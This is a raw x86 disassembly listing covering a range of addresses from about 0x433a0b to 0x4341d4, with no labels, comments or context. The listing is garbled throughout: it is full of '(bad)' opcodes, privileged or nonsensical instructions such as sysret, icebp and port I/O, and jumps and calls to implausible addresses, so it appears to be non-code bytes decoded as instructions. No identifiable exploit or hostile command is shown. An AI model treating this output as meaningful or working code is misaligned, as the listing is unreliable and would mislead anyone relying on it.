  433a0b:	inc    ebp
  433a0c:	mov    ecx,DWORD PTR [ebx-0xec6e70c]
  433a12:	cld    
  433a13:	mov    ebp,DWORD PTR [ebx+ecx*4-0x13baf3fa]
  433a1a:	push   0xffffff83
  433a1c:	pop    edi
  433a1d:	or     BYTE PTR [ebp+0x53],dh
  433a20:	xorps  xmm1,xmm2
  433a23:	test   BYTE PTR [eax+eax*1],bh
  433a26:	add    BYTE PTR [eax],al
  433a28:	adc    eax,eax
  433a2a:	add    DWORD PTR [esi+edi*2-0xff7b00],0xffffffb7
  433a32:	jmp    DWORD PTR [eax]
  433a34:	ror    al,0x5e
  433a37:	inc    ebp
  433a38:	leave  
  433a39:	xor    ecx,DWORD PTR [eax]
  433a3b:	and    DWORD PTR [ebx-0x3ec70708],ecx
  433a41:	add    ch,al
  433a43:	xor    edi,edi
  433a45:	xor    DWORD PTR [ebx],0x660033fe
  433a4b:	mov    DWORD PTR [ebp-0xc],ecx
  433a4e:	pcmpgtw mm0,mm0
  433a51:	add    dl,ah
  433a53:	leave  
  433a54:	mov    edi,DWORD PTR [eax-0x7d]
  433a57:	push   ax
  433a59:	dec    ebp
  433a5a:	mov    esi,DWORD PTR [ebx-0x75]
  433a5d:	lea    ebp,[eax-0x7c00fffe]
  433a63:	xor    eax,DWORD PTR [eax]
  433a65:	sysret 
  433a67:	dec    ebp
  433a68:	ror    BYTE PTR [ebx+0xc000c30],0x6a
  433a6f:	push   WORD PTR [ecx+0x8]
  433a73:	jne    0x433a36
  433a75:	ud0    ecx,DWORD PTR [ecx]
  433a78:	mov    edi,DWORD PTR [edx]
  433a7a:	lods   al,BYTE PTR ds:[esi]
  433a7b:	add    BYTE PTR [eax],al
  433a7d:	data16 (bad) 
  433a7f:	iret   
  433a80:	and    cl,BYTE PTR [eax*2+0x440f8d5d]
  433a87:	cli    
  433a88:	inc    ebp
  433a89:	cmp    al,0x8d
  433a8b:	add    BYTE PTR [esi+0x2d],ah
  433a8e:	inc    ebp
  433a8f:	pop    ebp
  433a90:	lea    ecx,[edi]
  433a92:	mov    dl,bh
  433a94:	add    BYTE PTR [edi],cl
  433a96:	mov    DWORD PTR [eax+eax*8],edi
  433a99:	mov    ebx,0x3a87
  433a9e:	add    BYTE PTR [ebx],ch
  433aa0:	inc    ebp
  433aa1:	data16 (bad) 
  433aa3:	clc    
  433aa4:	int3   
  433aa5:	cmp    eax,DWORD PTR [eax]
  433aa7:	je     0x433a32
  433aa9:	push   0xffffffc8
  433aab:	pop    edi
  433aac:	xchg   DWORD PTR [ebp+0x0],eax
  433aaf:	data16 add BYTE PTR [ebp+0x45],cl
  433ab3:	lea    cx,[ebp+0x10]
  433ab7:	jb     0x433ab9
  433ab9:	jmp    0x433a44
  433abb:	call   eax
  433abd:	clc    
  433abe:	xchg   DWORD PTR [edi+0x1],edi
  433ac1:	mov    eax,DWORD PTR [eax]
  433ac3:	or     BYTE PTR [ebp-0x49],al
  433ac6:	lea    eax,[eax+0x74003154]
  433acc:	push   edi
  433acd:	inc    edx
  433ace:	jge    0x433acf
  433ad0:	mov    DWORD PTR [edi],ecx
  433ad2:	fdiv   DWORD PTR [edi-0x6]
  433ad5:	inc    DWORD PTR [eax]
  433ad7:	xor    edx,DWORD PTR [eax+0x5f]
  433ada:	xchg   DWORD PTR [ebx+0x1],ebx
  433add:	ret    0x0
  433ae0:	xor    BYTE PTR [ebp-0x51],cl
  433ae3:	cmp    edi,0xf0ff8902
  433ae9:	data16 ror al,0x84
  433aed:	rol    BYTE PTR [eax],0x3b
  433af0:	add    al,dh
  433af2:	dec    eax
  433af3:	xchg   esp,eax
  433af4:	push   ebx
  433af5:	jmp    0x433a82
  433af7:	push   ebp
  433af8:	add    esp,ebp
  433afa:	add    ebp,esp
  433afc:	mov    edx,DWORD PTR [edi+0x24]
  433aff:	clc    
  433b00:	dec    esi
  433b01:	xchg   DWORD PTR [ebx+0x5e002001],ecx
  433b07:	cmp    BYTE PTR [ebx],al
  433b09:	jne    0x433a94
  433b0b:	xor    esp,eax
  433b0d:	jmp    0x463c90
  433b12:	add    ebp,DWORD PTR [ecx+ecx*4]
  433b15:	jne    0x433b0b
  433b17:	call   0xffcd3871
  433b1c:	clc    
  433b1d:	xchg   edi,eax
  433b1e:	sti    
  433b1f:	add    DWORD PTR [ebx],eax
  433b21:	add    BYTE PTR [ebp+0x47],bl
  433b24:	xor    ecx,DWORD PTR [ecx+0x47e8b489]
  433b2a:	pop    ebp
  433b2b:	mov    DWORD PTR [esi-0x48],esi
  433b2e:	jmp    0x433b77
  433b30:	mov    ecx,DWORD PTR [ecx-0x7882431c]
  433b36:	(bad)  
  433b38:	cmp    al,0x0
  433b3a:	cmp    eax,DWORD PTR [ebp+0x18]
  433b3d:	lea    ebx,[ebp-0x56]
  433b40:	jle    0x433b42
  433b42:	jae    0x433acd
  433b44:	mov    eax,esp
  433b46:	call   0xb900:0x8b005587
  433b4d:	inc    ebp
  433b4e:	push   ebp
  433b4f:	lea    ecx,[ebp-0x27ff4f12]
  433b55:	mov    eax,edi
  433b57:	int3   
  433b58:	push   ebp
  433b59:	xchg   edi,eax
  433b5b:	add    esp,ebp
  433b5d:	add    BYTE PTR [eax],al
  433b5f:	inc    ebp
  433b60:	add    BYTE PTR [ebp+0x8b3255],cl
  433b66:	cld    
  433b67:	mov    DWORD PTR [edx],edi
  433b69:	aam    0x75
  433b6b:	xchg   DWORD PTR [ebx+0x3400dc01],ecx
  433b71:	mov    DWORD PTR [ebx-0x50],edx
  433b74:	test   BYTE PTR [ebp-0x1],0xe8
  433b78:	mov    eax,DWORD PTR [eax]
  433b7a:	hlt    
  433b7b:	add    al,al
  433b7d:	mov    eax,DWORD PTR ds:0x890045a8
  433b83:	dec    DWORD PTR [ebx+0x45fdf0e8]
  433b89:	inc    DWORD PTR [eax*2+0xf75854d]
  433b90:	mov    ebp,DWORD PTR [ebp-0x7476ff18]
  433b96:	call   0x729998d7
  433b9b:	je     0x433bfb
  433b9d:	js     0x433bfe
  433b9f:	lock ret 0x7e
  433ba3:	mov    ecx,DWORD PTR [ebx+0x8568b1c]
  433ba9:	mov    edi,edi
  433bab:	sbb    al,bl
  433bad:	clc    
  433bae:	add    BYTE PTR [ebp-0x73],bh
  433bb1:	mov    ebx,DWORD PTR [eax-0x7437ffec]
  433bb7:	ror    BYTE PTR [eax],1
  433bb9:	dec    ebp
  433bba:	xchg   ebp,eax
  433bbb:	mov    edi,edi
  433bbd:	in     al,0x8b
  433bbf:	jge    0x433b4a
  433bc1:	cmp    ecx,DWORD PTR [ebx+0x39893377]
  433bc7:	clc    
  433bc8:	pop    esi
  433bc9:	fist   DWORD PTR [ebp+0x5d398b5d]
  433bcf:	clc    
  433bd0:	add    al,0x6e
  433bd2:	mov    eax,DWORD PTR [ebx]
  433bd4:	mov    BYTE PTR [ebp+0x0],dl
  433bd7:	mov    edx,DWORD PTR [ebx-0x20]
  433bda:	adc    esi,DWORD PTR [edi+0x5e005f38]
  433be0:	add    eax,0x3b3a73
  433be5:	adc    al,0x89
  433be7:	pop    eax
  433be8:	sbb    DWORD PTR [edx+eax*1],0xffffff8b
  433bec:	ret    0xf08
  433bef:	cmp    al,0x2
  433bf1:	mov    DWORD PTR [edx],edi
  433bf3:	cld    
  433bf4:	add    BYTE PTR [ebp+0x66],dl
  433bf7:	add    eax,ebx
  433bf9:	add    esp,eax
  433bfb:	sub    eax,eax
  433bfd:	or     BYTE PTR [ecx-0x77f474bb],cl
  433c03:	add    BYTE PTR [eax],al
  433c05:	mov    DWORD PTR [ebx-0x24],ebx
  433c08:	push   edi
  433c09:	push   ebp
  433c0a:	clc    
  433c0b:	add    DWORD PTR [esi+0x1b0100],0x45
  433c12:	out    0xff,eax
  433c14:	add    edx,DWORD PTR [eax]
  433c16:	jmp    0x433c00
  433c18:	cmp    ch,0x44
  433c1b:	(bad)  
  433c1c:	jmp    0x40c8c46e
  433c21:	je     0x433bad
  433c23:	mov    eax,DWORD PTR [eax-0x10c78104]
  433c29:	inc    ebp
  433c2a:	add    BYTE PTR [ebx-0x770375],al
  433c30:	add    ah,ch
  433c32:	add    edx,esp
  433c34:	pop    edi
  433c35:	pop    ebp
  433c36:	push   ebp
  433c37:	inc    ebx
  433c38:	in     al,dx
  433c39:	pop    ebp
  433c3a:	in     al,dx
  433c3b:	cmp    edx,DWORD PTR [edi-0x8]
  433c3e:	ss xchg esp,eax
  433c40:	pushf  
  433c41:	pop    ebx
  433c42:	mov    ecx,ecx
  433c44:	call   0x8998834d
  433c49:	in     al,dx
  433c4a:	in     al,0x45
  433c4c:	dec    ebp
  433c4d:	push   esi
  433c4e:	test   DWORD PTR [eax+0xfb010f],esi
  433c54:	add    BYTE PTR [eax+0xc018b],dh
  433c5a:	leave  
  433c5b:	inc    ebp
  433c5c:	test   al,ch
  433c5e:	add    dh,bh
  433c60:	add    bh,bh
  433c62:	dec    ebp
  433c63:	push   cs
  433c64:	mov    DWORD PTR [ecx],eax
  433c66:	hlt    
  433c67:	push   es
  433c68:	dec    ebp
  433c69:	leave  
  433c6a:	mov    DWORD PTR [eax],ecx
  433c6c:	clc    
  433c6d:	cmovge eax,ecx
  433c70:	mov    ecx,0x85c2f0
  433c76:	clc    
  433c77:	pop    DWORD PTR [ebp+0x1]
  433c7a:	push   ebx
  433c7b:	add    BYTE PTR [ebp-0x15],bh
  433c7e:	push   esi
  433c7f:	xor    eax,0x898a45
  433c84:	cld    
  433c85:	inc    BYTE PTR [ebp+0x0]
  433c88:	cmp    BYTE PTR [esi-0x64],ah
  433c8b:	add    DWORD PTR [esi+0x78308c1],edi
  433c91:	add    ah,BYTE PTR [edi-0x49]
  433c94:	int    0xbb
  433c96:	mov    ecx,DWORD PTR [edi+0xc]
  433c99:	add    dh,al
  433c9b:	cmp    ecx,ebx
  433c9d:	jne    0x433c67
  433c9f:	xor    ecx,DWORD PTR [ebp+0x66]
  433ca2:	jmp    0xca3ca8
  433ca7:	add    DWORD PTR [ebp+0x0],eax
  433caa:	mov    eax,ebx
  433cac:	or     al,0x8b
  433cae:	(bad)  
  433caf:	mov    ecx,esi
  433cb1:	mov    BYTE PTR [eax+eax*1+0x664c132],cl
  433cb8:	mov    eax,edi
  433cba:	or     BYTE PTR [edx],cl
  433cbc:	shl    cl,cl
  433cbe:	icebp  
  433cbf:	add    BYTE PTR [ebp+0x3a],0x8b
  433cc3:	or     BYTE PTR [edx+eax*2],cl
  433cc6:	(bad)  
  433cc7:	or     cl,dh
  433cc9:	stc    
  433cca:	shl    DWORD PTR [ebp-0x30],0xc6
  433cce:	xor    al,0x0
  433cd0:	inc    ebp
  433cd1:	xchg   BYTE PTR [ebx],al
  433cd3:	add    esp,edi
  433cd5:	add    BYTE PTR [ebp-0x39],cl
  433cd8:	mov    al,bl
  433cda:	test   DWORD PTR [ebx+0x1c348375],ecx
  433ce0:	sub    al,0xbf
  433ce2:	jmp    0x433c69
  433ce4:	mov    edi,eax
  433ce6:	lock jge 0x433cda
  433ce9:	lea    esi,[edx-0x74bad5fd]
  433cef:	mov    ebp,esp
  433cf1:	or     cl,dh
  433cf3:	leave  
  433cf4:	add    al,BYTE PTR [eax+eax*4-0x37ff9900]
  433cfb:	dec    ebp
  433cfc:	dec    ebp
  433cfd:	test   DWORD PTR [ebx],eax
  433cff:	paddb  mm6,mm0
  433d02:	add    DWORD PTR [eax],eax
  433d04:	dec    ebp
  433d05:	mov    ecx,DWORD PTR [ebx-0x66b217f0]
  433d0b:	mov    esi,DWORD PTR [edx]
  433d0d:	or     al,0x2b
  433d0f:	dec    ebp
  433d10:	xor    ecx,DWORD PTR [ebx+0x4575083b]
  433d16:	mov    esp,edx
  433d18:	adc    BYTE PTR [ebp+edx*2+0x33ec3389],bl
  433d1f:	mov    DWORD PTR [ebx],ebp
  433d21:	call   0xc76c651
  433d26:	mov    DWORD PTR [ebp+0x10],ecx
  433d29:	(bad)  
  433d2a:	push   0x8b85ff10
  433d2f:	clc    
  433d30:	or     al,0x51
  433d32:	(bad)  
  433d33:	push   ecx
  433d34:	retf   
  433d35:	mov    ebx,0xff4d8dc8
  433d3a:	mov    DWORD PTR [ebp+0x8],eax
  433d3d:	xor    eax,DWORD PTR [ebp-0x75]
  433d40:	cmp    ebp,DWORD PTR [ebx]
  433d42:	lsl    ebx,WORD PTR [edi-0x8]
  433d46:	call   DWORD PTR [ebx-0x741bff75]
  433d4c:	(bad)  
  433d4d:	or     al,0x5b
  433d4f:	dec    ebp
  433d50:	or     BYTE PTR [ebx],dh
  433d52:	inc    ebp
  433d53:	xor    esi,DWORD PTR ds:0x708088d
  433d59:	in     eax,0x99
  433d5b:	add    BYTE PTR [edx],dh
  433d5d:	inc    ebp
  433d5e:	pop    edi
  433d5f:	xor    eax,edx
  433d61:	test   DWORD PTR [eax],0x81108b8b
  433d67:	dec    ebp
  433d68:	sub    al,0x33
  433d6a:	add    BYTE PTR [ebx],dh
  433d6c:	push   esi
  433d6d:	sub    ecx,DWORD PTR [ebx-0x768accc5]
  433d73:	mov    edi,eax
  433d75:	or     BYTE PTR [ebp+0x45],al
  433d78:	mov    DWORD PTR [ebx+0x45f4ec],ecx
  433d7e:	ss leave 
  433d80:	pushf  
  433d81:	push   es
  433d82:	mov    DWORD PTR [esp+edi*8+0x3a],0x4df81785
  433d8a:	inc    ebp
  433d8b:	cmp    BYTE PTR [esi],0x51
  433d8e:	pushf  
  433d8f:	addr16 (bad) 
  433d91:	shl    esp,1
  433d93:	dec    ebp
  433d94:	xchg   BYTE PTR [eax-0x3dbaae08],al
  433d9a:	(bad)  
  433d9b:	jmp    0x8c0b1077
  433da0:	aam    0x8
  433da2:	test   DWORD PTR [ebp-0x8],ecx
  433da5:	mov    BYTE PTR [ebp-0x75],al
  433da8:	or     BYTE PTR [eax],cl
  433daa:	add    BYTE PTR [ebp-0x75],dl
  433dad:	mov    eax,0xfc728b
  433db2:	dec    ebp
  433db3:	enter  0xceba,0x8
  433db7:	retf   0x1807
  433dba:	ret    0x994d
  433dbd:	mov    esi,DWORD PTR [edx]
  433dbf:	or     al,0x33
  433dc1:	into   
  433dc2:	add    edx,esi
  433dc4:	add    ecx,edx
  433dc6:	bswap  eax
  433dc8:	ror    esi,0x98
  433dcb:	dec    ebp
  433dcc:	add    cl,ch
  433dce:	mov    edi,edi
  433dd0:	hlt    
  433dd1:	inc    esi
  433dd3:	inc    ebp
  433dd4:	ret    0x4533
  433dd7:	mov    ecx,DWORD PTR [ebx+0x4d03fc2b]
  433ddd:	or     BYTE PTR [ebx],dh
  433ddf:	dec    ebp
  433de0:	xor    ecx,DWORD PTR [ebx-0x38fceffd]
  433de6:	jne    0xff8d3dad
  433dec:	inc    ebp
  433ded:	inc    ebp
  433dee:	mov    esi,DWORD PTR [ebx]
  433df0:	clc    
  433df1:	pop    esi
  433df2:	ret    0xcaeb
  433df5:	mov    eax,esi
  433df7:	call   0x52048fca
  433dfc:	dec    ebp
  433dfd:	add    eax,0xf8728b
  433e02:	adc    eax,0xce0ccac9
  433e07:	push   ebp
  433e08:	ret    0xc6ec
  433e0b:	in     al,dx
  433e0c:	call   0x33438b15
  433e11:	push   edi
  433e12:	add    edi,eax
  433e14:	xor    eax,eax
  433e16:	jmp    0x433e5d
  433e18:	xor    ecx,DWORD PTR [ecx+0x4503f433]
  433e1e:	add    eax,edi
  433e20:	shr    eax,cl
  433e22:	mov    DWORD PTR [ebp+0x4545f8f8],eax
  433e28:	mov    edi,DWORD PTR [ecx]
  433e2a:	in     al,dx
  433e2b:	pushf  
  433e2c:	ret    0x84c7
  433e2f:	fcomp  DWORD PTR [ecx-0x7607cd7b]
  433e35:	inc    ebp
  433e36:	in     al,dx
  433e37:	ss inc ebp
  433e39:	pushf  
  433e3a:	mov    eax,edi
  433e3c:	cld    
  433e3d:	fmul   st(2),st
  433e3f:	sbb    dl,al
  433e41:	jmp    0x9c3b:0x374d45c1
  433e48:	jbe    0x433e11
  433e4a:	mov    esp,eax
  433e4c:	clc    
  433e4d:	add    BYTE PTR [ebp+0x0],cl
  433e50:	mov    ecx,ecx
  433e52:	lea    eax,[ebp-0x5]
  433e55:	mov    edi,edi
  433e57:	call   0x51ce8fa1
  433e5c:	hlt    
  433e5d:	xor    eax,edx
  433e5f:	mov    esi,0x997284
  433e64:	xor    cl,dl
  433e66:	mov    esi,eax
  433e68:	hlt    
  433e69:	into   
  433e6a:	inc    ebp
  433e6b:	scas   eax,DWORD PTR es:[edi]
  433e6c:	mov    ebp,ecx
  433e6e:	cld    
  433e6f:	add    dl,cl
  433e71:	add    dl,al
  433e73:	inc    ebp
  433e74:	shr    DWORD PTR [ebx],0x4d
  433e77:	xor    edi,DWORD PTR [ebx]
  433e79:	mov    DWORD PTR [edi],ecx
  433e7b:	clc    
  433e7c:	dec    esi
  433e7d:	inc    ebp
  433e7e:	dec    DWORD PTR [ebx-0x3d2b1775]
  433e84:	ret    0xc6ca
  433e87:	mov    BYTE PTR [ebp-0x32],0x53
  433e8b:	scas   eax,DWORD PTR es:[edi]
  433e8c:	inc    ebp
  433e8d:	jmp    0x433ec6
  433e8f:	mov    ebx,DWORD PTR [esp+edi*8+0x335b4d8b]
  433e96:	pop    ebx
  433e97:	xor    ecx,DWORD PTR [ebp+0x3]
  433e9a:	mov    eax,DWORD PTR [ebx]
  433e9c:	clc    
  433e9d:	test   edx,ecx
  433e9f:	mov    ecx,esi
  433ea1:	cld    
  433ea2:	call   0x8ab783ec
  433ea7:	xor    ecx,DWORD PTR [eax+0x4533f303]
  433ead:	add    ecx,DWORD PTR [ebx-0x4974072d]
  433eb3:	fdiv   QWORD PTR [ebx]
  433eb5:	retf   0xce89
  433eb8:	in     al,0xc1
  433eba:	inc    ebp
  433ebb:	or     cl,BYTE PTR [ebx-0x3d3d1b36]
  433ec1:	into   
  433ec2:	mov    dh,0xc1
  433ec5:	call   0x8c17844e
  433eca:	(bad)  
  433ecb:	cld    
  433ecc:	mov    ecx,DWORD PTR [ebp-0x14]
  433ecf:	xor    eax,ecx
  433ed1:	lea    eax,[ebp+0x8]
  433ed4:	mov    esi,DWORD PTR [edx-0x4]
  433ed7:	add    dl,al
  433ed9:	inc    ebp
  433eda:	mov    esp,0x32d8998b
  433edf:	dec    ebp
  433ee0:	mov    esi,DWORD PTR [ebx]
  433ee2:	cld    
  433ee3:	xor    eax,edx
  433ee5:	sub    esp,DWORD PTR [edi-0x75]
  433ee8:	int    0xec
  433eea:	sub    ecx,eax
  433eec:	add    esp,DWORD PTR [ecx-0x74b2ba20]
  433ef2:	mov    esi,esp
  433ef4:	call   0x34178c7d
  433ef9:	inc    DWORD PTR [ebx]
  433efb:	mov    edi,DWORD PTR [ebx]
  433efd:	cld    
  433efe:	jne    0x433f4d
  433f00:	mov    esi,DWORD PTR [ebx]
  433f02:	aam    0x8d
  433f04:	dec    ebp
  433f05:	or     BYTE PTR [ebx],dh
  433f07:	jb     0x433f0c
  433f09:	add    BYTE PTR [edi+0x45],bl
  433f0c:	ror    DWORD PTR [ebx+0x4d55e4c9],0xec
  433f13:	xor    ebp,esp
  433f15:	xor    eax,edi
  433f17:	sub    edi,esp
  433f19:	mov    eax,DWORD PTR [ebp+0x39c8f8f4]
  433f1f:	xchg   BYTE PTR [edi+edi*8+0x45e8ff89],bl
  433f26:	inc    ebp
  433f27:	xor    ecx,DWORD PTR [ecx+0x45891403]
  433f2d:	clc    
  433f2e:	mov    eax,edi
  433f30:	nop
  433f31:	fadd   QWORD PTR [eax]
  433f33:	xchg   BYTE PTR [ebx+0xdb14f8],cl
  433f39:	jmp    0x433ec4
  433f3b:	mov    eax,DWORD PTR [ecx]
  433f3d:	fadd   DWORD PTR [eax]
  433f3f:	inc    ebp
  433f40:	or     DWORD PTR [ebx],esi
  433f42:	dec    eax
  433f43:	add    edx,DWORD PTR [ebx-0x2d]
  433f46:	dec    ebp
  433f47:	mov    DWORD PTR [ebx+0x5707fcec],ecx
  433f4d:	inc    ebp
  433f4e:	push   ecx
  433f4f:	mov    dl,BYTE PTR [ecx-0xd]
  433f52:	xor    ecx,DWORD PTR [ebp-0x45]
  433f55:	(bad)  
  433f57:	rol    BYTE PTR [eax],0xc1
  433f5a:	ret    
  433f5b:	inc    ebp
  433f5c:	inc    ebp
  433f5d:	mov    ecx,DWORD PTR [ebx-0x38b20324]
  433f63:	xor    eax,ebx
  433f65:	add    eax,DWORD PTR [ebp+0x23]
  433f68:	mov    ecx,DWORD PTR [ebx-0x4bf7a08]
  433f6e:	cmp    edi,0xc
  433f71:	dec    ebp
  433f72:	inc    ebp
  433f73:	xor    ecx,DWORD PTR [ebx+0x40f8f889]
  433f79:	inc    ebp
  433f7a:	mov    esi,DWORD PTR [ebx]
  433f7c:	clc    
  433f7d:	lea    eax,[ebp+0x45725407]
  433f83:	add    BYTE PTR [ebp+eax*2-0x75],dh
  433f87:	xor    edi,DWORD PTR [eax]
  433f89:	mov    ecx,0xff8b8d4d
  433f8e:	push   esp
  433f8f:	enter  0x4df7,0x23
  433f93:	mov    DWORD PTR [ebx+0x4045f8e0],ecx
  433f99:	mov    eax,DWORD PTR [ebx]
  433f9b:	loopne 0x433f88
  433f9d:	ret    0xc68b
  433fa0:	push   esp
  433fa1:	enter  0x9745,0x8b
  433fa5:	inc    ebp
  433fa6:	cld    
  433fa7:	mov    eax,edi
  433fa9:	clc    
  433faa:	ret    
  433fab:	ret    0xc645
  433fae:	mov    esi,DWORD PTR [ebx]
  433fb0:	cld    
  433fb1:	pop    esi
  433fb2:	mov    ebx,0x83458bc3
  433fb8:	mov    ebp,DWORD PTR [esp+edi*8+0x45]
  433fbc:	dec    ebp
  433fbd:	xor    ebx,DWORD PTR ss:[ebx+eax*1-0x767a7646]
  433fc5:	clc    
  433fc6:	fcom   DWORD PTR [ebp+0x45]
  433fc9:	mov    edi,DWORD PTR [eax]
  433fcb:	adc    al,0x9c
  433fcd:	inc    ebp
  433fce:	(bad)  
  433fcf:	mov    ebx,eax
  433fd1:	adc    al,0x85
  433fd3:	cmp    al,0x1
  433fd6:	inc    ebp
  433fd7:	add    BYTE PTR [edx],bh
  433fd9:	dec    ebp
  433fda:	pushf  
  433fdb:	mov    ebp,ecx
  433fdd:	mov    eax,DWORD PTR [ebx]
  433fdf:	nop
  433fe0:	add    BYTE PTR [eax],al
  433fe2:	inc    ebp
  433fe3:	mov    esi,DWORD PTR [ebx]
  433fe5:	add    eax,DWORD PTR [ebx]
  433fe7:	cmp    al,0x89
  433fe9:	mov    esp,esi
  433feb:	clc    
  433fec:	inc    ebp
  433fed:	inc    ebp
  433fee:	add    edx,DWORD PTR [esi+0xc]
  433ff1:	mov    edi,0x7ff0845
  433ff6:	in     al,dx
  433ff7:	(bad)  
  433ff8:	jne    0x433f93
  433ffa:	mov    esi,DWORD PTR [edx]
  433ffc:	clc    
  433ffd:	add    ebp,DWORD PTR [esi]
  433fff:	mov    edi,edi
  434001:	in     al,dx
  434002:	mov    DWORD PTR [ebp-0x10],eax
  434005:	xor    eax,DWORD PTR [ebp+0x3]
  434008:	mov    DWORD PTR ds:[esp+esi*8-0x7427ba75],ebx
  434010:	(bad)  
  434011:	push   eax
  434012:	ret    
  434013:	call   0xd4ffc9a5
  434018:	call   0xffcf3862
  43401d:	cmp    BYTE PTR [ebp+0x4d],al
  434020:	test   DWORD PTR [eax+0x74],ecx
  434023:	inc    ecx
  434024:	mov    ecx,DWORD PTR [ebx+0x18c7f8d8]
  43402a:	ret    
  43402b:	inc    eax
  43402c:	dec    DWORD PTR [ebx+0x4945f8f0]
  434032:	push   eax
  434033:	dec    eax
  434034:	test   al,0xd0
  434036:	dec    eax
  434038:	mov    eax,DWORD PTR [ebp-0x14]
  43403b:	mov    eax,DWORD PTR [ebp+0x38]
  43403e:	mov    eax,ecx
  434040:	fadd   DWORD PTR [ebx]
  434042:	dec    ebp
  434043:	inc    eax
  434044:	sub    ecx,DWORD PTR [ecx+0x45d81489]
  43404a:	inc    ebp
  43404b:	xor    ecx,DWORD PTR [ebx+0x4089f003]
  434051:	fadd   QWORD PTR [ebx]
  434053:	inc    ebp
  434054:	or     al,0x33
  434056:	dec    ebp
  434057:	add    edi,DWORD PTR [ebx]
  434059:	mov    DWORD PTR [edx-0x28],esi
  43405c:	mov    eax,DWORD PTR [ebp-0x10]
  43405f:	mov    eax,DWORD PTR [eax+0x10]
  434062:	mov    eax,edi
  434064:	lock ret 
  434066:	inc    ecx
  434067:	add    DWORD PTR [ebx-0x3e3827ab],ecx
  43406d:	fsubr  st,st(5)
  43406f:	test   DWORD PTR [eax],eax
  434071:	clc    
  434072:	push   0x45
  434074:	(bad)  
  434075:	cmp    ebp,esp
  434077:	pushf  
  434078:	inc    ebp
  434079:	(bad)  
  43407a:	push   eax
  43407b:	fsub   DWORD PTR [eax-0x7b]
  43407e:	(bad)  
  43407f:	clc    
  434080:	mov    eax,0xf8008584
  434085:	mov    eax,DWORD PTR [ebp-0x4]
  434088:	mov    edi,0x4585c3cc
  43408e:	clc    
  43408f:	mov    eax,DWORD PTR [ebp+0x14]
  434092:	cmp    BYTE PTR [ebp-0x64],al
  434095:	mov    edi,eax
  434097:	in     al,dx
  434098:	les    esi,FWORD PTR [ebp-0x7b]
  43409b:	mov    edi,eax
  43409d:	or     al,0x4d
  43409f:	dec    ebp
  4340a0:	mov    eax,ebp
  4340a2:	in     al,0xf2
  4340a4:	dec    ebp
  4340a5:	dec    DWORD PTR [ecx+0x4dc7e045]
  4340ab:	fmul   DWORD PTR [ecx+0x4df8f085]
  4340b1:	inc    ebp
  4340b2:	mov    DWORD PTR [ebx],esi
  4340b4:	fadd   QWORD PTR [ebx]
  4340b6:	dec    ebp
  4340b7:	push   eax
  4340b8:	xor    eax,DWORD PTR [ebp+0x3]
  4340bb:	push   eax
  4340bc:	mov    DWORD PTR [eax+ebx*8],ebx
  4340bf:	push   esi
  4340c1:	mov    eax,DWORD PTR [eax]
  4340c3:	lock cmp eax,0xf84e85c0
  4340c9:	inc    ebp
  4340ca:	test   BYTE PTR [ebx],dh
  4340cc:	add    DWORD PTR [ebx],eax
  4340ce:	add    BYTE PTR [eax+0x4d],dl
  4340d1:	jne    0x434106
  4340d3:	lea    ecx,[ebx-0x7617fc44]
  4340d9:	div    ah
  4340db:	inc    DWORD PTR [ebp+0x45]
  4340de:	xor    ecx,DWORD PTR [ecx+0x4530d88d]
  4340e4:	jb     0x434071
  4340e6:	add    BYTE PTR [eax*2-0x17ba743f],cl
  4340ed:	mov    ecx,DWORD PTR [ebp-0x10]
  4340f0:	xor    ecx,DWORD PTR [ebp+0x3]
  4340f3:	mov    edi,DWORD PTR [ebx]
  4340f5:	adc    BYTE PTR [ebp+0x41],dh
  4340f8:	mov    ecx,DWORD PTR [ebx-0x37382704]
  4340fe:	ret    
  4340ff:	push   ss
  434100:	push   0x45
  434102:	lea    ecx,[ebx+0x4de80cb0]
  434108:	sti    
  434109:	add    edi,edi
  43410b:	or     BYTE PTR [ebp+0x4d],al
  43410e:	mov    ebp,DWORD PTR [ebx]
  434110:	xor    ebp,ecx
  434112:	mov    al,BYTE PTR [edx]
  434114:	add    eax,0xc7200
  434119:	jne    0x434168
  43411b:	lea    esi,[ebx]
  43411d:	mov    al,0xf
  43411f:	call   0xf37e4
  434124:	shl    DWORD PTR [esi],0x84
  434127:	pushf  
  434128:	add    DWORD PTR [ecx+0x4545d000],ecx
  43412e:	mov    edi,DWORD PTR [ecx]
  434130:	xor    ebx,DWORD PTR [edx+ecx*4+0x72c805c7]
  434137:	test   DWORD PTR [eax],eax
  434139:	clc    
  43413a:	dec    ebp
  43413b:	inc    ebp
  43413c:	xor    edi,DWORD PTR [ebx]
  43413e:	setl   al
  434141:	(bad)  
  434142:	retf   
  434143:	rol    cl,1
  434145:	dec    ebp
  434146:	test   BYTE PTR [ebp+0x4d00cc01],cl
  43414c:	inc    ebp
  43414d:	lea    ecx,[ebx-0x75b2cc38]
  434153:	lea    eax,ds:0x4d72c4
  434159:	mov    ecx,DWORD PTR [ebp-0x4]
  43415c:	xor    ecx,edi
  43415e:	bswap  ebx
  434160:	ror    BYTE PTR [ebp-0x35],0xe9
  434164:	rol    DWORD PTR [ecx],0x84
  434167:	add    BYTE PTR [ecx],al
  434169:	cmp    BYTE PTR [eax],al
  43416b:	pushf  
  43416c:	inc    ebp
  43416d:	jnp    0x8a437570
  434173:	mov    eax,DWORD PTR ds:0xcf72e8
  434179:	lock dec ebp
  43417b:	retf   
  43417c:	xor    ecx,DWORD PTR [ebp+0xf]
  43417f:	mov    eax,eax
  434181:	fmul   st,st(3)
  434183:	test   ecx,0x1998484
  434189:	xor    al,BYTE PTR [eax]
  43418b:	mov    DWORD PTR [ebp-0x28],eax
  43418e:	mov    eax,DWORD PTR [ebp+0x33]
  434191:	mov    ecx,DWORD PTR [edx+0x72c705d8]
  434197:	ret    
  434198:	add    al,cl
  43419a:	dec    ebp
  43419b:	adc    ecx,DWORD PTR [ebx-0x75ccccbb]
  4341a1:	add    ecx,DWORD PTR ds:0xc7250
  4341a7:	inc    ebp
  4341a8:	rcl    DWORD PTR [eax+0x4d],0x2b
  4341ac:	mov    edi,edi
  4341ae:	xor    ecx,DWORD PTR [ebx+0xde48a]
  4341b4:	jb     0x43417d
  4341b6:	add    BYTE PTR [ecx+eax*8-0x74cdb2b7],al
  4341bd:	mov    esi,DWORD PTR [ebx]
  4341bf:	cld    
  4341c0:	mov    cl,bh
  4341c2:	or     eax,0x372b6
  4341c7:	cmp    ecx,eax
  4341c9:	jne    0x434246
  4341cf:	mov    eax,DWORD PTR [ebp-0x20]
  4341d2:	mov    eax,DWORD PTR [eax]
  4341d4:	xor    eax,edi
